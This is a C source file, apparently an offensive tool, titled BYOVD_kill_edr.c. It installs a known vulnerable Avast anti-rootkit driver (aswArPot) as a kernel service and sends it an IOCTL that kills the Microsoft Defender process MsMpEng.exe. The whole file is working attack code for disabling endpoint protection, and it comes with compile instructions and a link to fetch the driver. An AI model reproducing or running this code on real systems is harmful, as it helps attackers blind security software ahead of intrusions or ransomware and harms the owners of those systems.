// BYOVD_kill_edr.c
// Author : @infosecn1nja
// compile : x86_64-w64-mingw32-gcc -o kill_edr.exe kill_edr.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <ctype.h>

#define IOCTL_ADDR 0x9988c094

DWORD find_pid_by_name(const char* proc_name) {
    HANDLE snapshot;
    PROCESSENTRY32 entry;
    DWORD pid = 0;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot.\n");
        return 0;
    }

    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp(entry.szExeFile, proc_name) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

int main(void) {
        SC_HANDLE hSCManager, hService;
        // https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/a179c4093d05a3e1ee73f6ff07f994aa.bin
        const char* driverPath = "C:\\ProgramData\\aswArPot.bin";
        const char* serviceName = "aswArPot";

        // Open the Service Control Manager
        hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCManager == NULL) {
            printf("Failed to open Service Control Manager.\n");
            return 1;
        }

        // Create a service for the driver
        hService = CreateService(hSCManager, serviceName, serviceName,
                                 SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                 SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                 driverPath, NULL, NULL, NULL, NULL, NULL);
        if (hService == NULL) {
            printf("Failed to create service for the driver.\n");
            CloseServiceHandle(hSCManager);
            return 1;
        }

        printf("Driver installed successfully.\n");

        // Cleanup and close handles
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);

        unsigned int res;
        DWORD lpBytesReturned = 0;

        HANDLE hDevice = CreateFileA("\\\\.\\aswSP_Avar", GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if(hDevice == INVALID_HANDLE_VALUE){
                return -1;
        }

        const char* process_name = "MsMpEng.exe";
        DWORD pid = find_pid_by_name(process_name);

        res = DeviceIoControl(hDevice, IOCTL_ADDR, &pid, sizeof(pid), NULL, 0, &lpBytesReturned, NULL);

        if (!res) {
                printf("Killing IOCTL failed\n");
                CloseHandle(hDevice);
                return -1;
        }
         
        printf("IOCTL command sent successfully to kill process '%s'.\n", process_name);
        CloseHandle(hDevice);
         
        return 0;
}
